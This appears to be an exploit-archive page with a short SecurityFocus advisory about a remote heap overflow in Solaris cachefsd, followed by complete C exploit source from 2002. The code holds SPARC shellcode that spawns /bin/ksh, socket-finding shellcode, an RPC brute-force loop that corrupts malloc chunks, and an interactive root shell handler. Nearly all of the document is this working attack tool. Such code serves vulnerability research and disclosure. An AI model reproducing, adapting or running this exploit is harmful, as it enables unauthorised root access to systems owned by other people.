source: http://www.securityfocus.com/bid/4674/info

A remotely exploitable buffer overflow condition has been reported in cachefsd. The overflow occurs in the heap and is reportedly exploitable as valid malloc() chunk structures are overwritten. Successful attacks may result in remote attackers gaining root access on the affected system. 

/*## copyright LAST STAGE OF DELIRIUM jan 2002 poland        *://lsd-pl.net/ #*/
/*## cachefsd                                                                #*/

/* this code was tested on sun4u and sun4m architecture for Solaris 6/7.      */
/* due to large data transfers of about 100KB and the use of some brute       */
/* force technique the code may need some time to proceed.                    */
/* for older sparc architectures try using the -m option.                     */
/* in case the exploit fails after passing all cycles of the brute force loop */
/* try to use the -b option.                                                  */


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define CACHEFS_PROG 100235
#define CACHEFS_VERS 1
#define CACHEFS_MOUNTED 5

#define NOPNUM  60

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>          */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>            */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>          */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0             */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1             */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]            */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]           */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]           */
    "\x82\x10\x20\x0b"     /* mov     0x0b,%g1               */
    "\x91\xd0\x20\x08"     /* ta      8                      */
    "/bin/ksh"
;

char findsckcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode>          */
    "\x7f\xff\xff\xff"     /* call    <findsckcode+4>        */
    "\x33\x02\x12\x34"
    "\xa0\x10\x20\xff"     /* mov     0xff,%l0               */
    "\xa2\x10\x20\x54"     /* mov     0x54,%l1               */
    "\xa4\x03\xff\xd0"     /* add     %o7,-48,%l2            */
    "\xaa\x03\xe0\x28"     /* add     %o7,40,%l5             */
    "\x81\xc5\x60\x08"     /* jmp     %l5+8                  */
    "\xc0\x2b\xe0\x04"     /* stb     %g0,[%o7+4]            */
    "\xe6\x03\xff\xd0"     /* ld      [%o7-48],%l3           */
    "\xe8\x03\xe0\x04"     /* ld      [%o7+4],%l4            */
    "\xa8\xa4\xc0\x14"     /* subcc   %l3,%l4,%l4            */
    "\x02\xbf\xff\xfb"     /* bz      <findsckcode+32>       */
    "\xaa\x03\xe0\x5c"     /* add     %o7,92,%l5             */
    "\xe2\x23\xff\xc4"     /* st      %l1,[%o7-60]           */
    "\xe2\x23\xff\xc8"     /* st      %l1,[%o7-56]           */
    "\xe4\x23\xff\xcc"     /* st      %l2,[%o7-52]           */
    "\x90\x04\x20\x01"     /* add     %l0,1,%o0              */
    "\xa7\x2c\x60\x08"     /* sll     %l1,8,%l3              */
    "\x92\x14\xe0\x91"     /* or      %l3,0x91,%o1           */
    "\x94\x03\xff\xc4"     /* add     %o7,-60,%o2            */
    "\x82\x10\x20\x36"     /* mov     0x36,%g1               */
    "\x91\xd0\x20\x08"     /* ta      8                      */
    "\x1a\xbf\xff\xf1"     /* bcc     <findsckcode+36>       */
    "\xa0\xa4\x20\x01"     /* deccc   %l0                    */
    "\x12\xbf\xff\xf5"     /* bne     <findsckcode+60>       */
    "\xa6\x10\x20\x03"     /* mov     0x03,%l3               */
    "\x90\x04\x20\x02"     /* add     %l0,2,%o0              */
    "\x92\x10\x20\x09"     /* mov     0x09,%o1               */
    "\x94\x04\xff\xff"     /* add     %l3,-1,%o2             */
    "\x82\x10\x20\x3e"     /* mov     0x3e,%g1               */
    "\xa6\x84\xff\xff"     /* addcc   %l3,-1,%l3             */
    "\x12\xbf\xff\xfb"     /* bne     <findsckcode+112>      */
    "\x91\xd0\x20\x08"     /* ta      8                      */
;

static char nop[]="\x80\x1c\x40\x11";

typedef struct{char *dir;char *cache;}req_t;

bool_t xdr_req(XDR *xdrs,req_t *objp){
    if(!xdr_string(xdrs,&objp->dir,~0)) return(FALSE);
    if(!xdr_string(xdrs,&objp->cache,~0)) return(FALSE);
    return(TRUE);
}

int tab[]={
    0x11111111,0x11111111,0xffffffff,0x00000000,
    0xffffffff,0xffffffff,0xffffffff,0xffffffff,
    0xffffffff,0x00000000,0x22222222,0x22222222
};

main(int argc,char **argv){
    char buffer[100000],*b;
    int i,j,c,n,address,offset=0,ofs=0,port=0,sck,flag=0,mflag=0,vers=-1;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("copyright LAST STAGE OF DELIRIUM jan 2002 poland  //lsd-pl.net/\n");
    printf("cachefsd for solaris 2.6 2.7 sparc\n\n");

    if(argc<2){
        printf("usage: %s address [-p port] [-o ofs] -v 6|7 [-b] [-m]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"p:o:v:bm"))!=-1){
        switch(c){
        case 'p': port=atoi(optarg);break;
        case 'o': offset=atoi(optarg);break;
        case 'v': vers=atoi(optarg);break;
        case 'b': flag=1;break;
	case 'm': mflag=1;
        }
    }

    switch(vers){
    case 6: address=0xefffeb20;break;
    case 7: case 8: address=0xffbee998;break;
    default: exit(-1);
    }
    if(mflag) address=0xeffffa1c;
    for(j=0;j<512;j++){
        tab[0]=tab[1]=htonl(0xfffffffe);
        tab[3]=htonl(address+offset+ofs+((flag)?80:0));
        tab[9]=htonl(address+offset+ofs+((mflag)?-4136:4228));

        if(!j){
            printf("ret=0x%08x adr=0x%08x ofs=%d timeout=%d\n",
	        ntohl(tab[9]),ntohl(tab[3]),offset,
	        tm.tv_sec);
        }

        adr.sin_family=AF_INET;
        adr.sin_port=htons(port);
        if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if((hp=gethostbyname(argv[1]))==NULL){
	        errno=EADDRNOTAVAIL;perror("\nerror");exit(-1);
            }
            memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
        }
  
        sck=RPC_ANYSOCK;
        if(!(cl=clnttcp_create(&adr,CACHEFS_PROG,CACHEFS_VERS,&sck,0,0))){
            clnt_pcreateerror("\nclnttcp_create error");exit(-1);
        }
        cl->cl_auth=authunix_create("localhost",0,0,0,NULL);

        memset(buffer,0xff,60000);
        buffer[60000]=0;

        req.dir=buffer;
        req.cache="lsd";

        stat=clnt_call(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if(stat!=RPC_SUCCESS) {clnt_perror(cl,"\nerror");exit(-1);}

        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=ntohs(adr.sin_port);

        findsckcode[14+0]=(unsigned char)((n>>8)&0xff);
        findsckcode[14+1]=(unsigned char)(n&0xff);

        memset(buffer,0x41,14000);
        b=buffer; 
        for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
        for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
        memcpy(&buffer[13920],tab,40);
        buffer[14000]=0;

        req.dir="/var/lp";
        req.cache=buffer;
        stat=clnt_call(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if(stat!=RPC_SUCCESS) {clnt_perror(cl,"\nerror");exit(-1);}
        stat=clnt_call(cl,CACHEFS_MOUNTED,xdr_req,(void*)&req,xdr_void,NULL,tm);
        if((stat==RPC_SUCCESS)||(stat==RPC_CANTRECV)){
            clnt_destroy(cl);close(sck);
            ofs=(j%2)?(-((j>>1)+1)*4):(((j>>1)+1)*4);
	    printf(".");fflush(stdout);
        }else break;
    }

    printf("OK! adr=0x%08x\n",ntohl(tab[3]));
    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
	    int cnt;
	    char buf[1024];
	    if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
	            if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
	            else break;
                }
	        write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
	            if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
	            else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}

